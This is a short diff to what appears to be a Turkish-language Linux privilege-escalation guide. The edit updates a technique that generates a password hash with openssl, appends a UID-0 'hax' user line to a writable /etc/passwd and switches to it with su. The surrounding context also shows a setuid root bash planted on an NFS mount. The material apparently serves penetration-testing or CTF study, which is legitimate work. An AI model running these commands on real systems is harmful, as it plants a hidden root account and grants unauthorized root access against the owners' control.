@@ -153,12 +153,12 @@ chmod +s /mnt/nfs/rootbash
 # /etc/passwd yazılabilir mi?
 ls -la /etc/passwd
 
-# Parola hash'i oluştur
-openssl passwd -1 -salt hax s3cr3t
-# Çıktı: $1$hax$Yos...
+# Parola hash'i oluştur (SHA-512 — modern Linux varsayılanı)
+openssl passwd -6 -salt hax s3cr3t
+# Çıktı: $6$hax$...
 
 # Satırı ekle
-echo 'hax:$1$hax$Yos...:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'hax:$6$hax$...:0:0:root:/root:/bin/bash' >> /etc/passwd
 su hax  # parola: s3cr3t
 ```
 
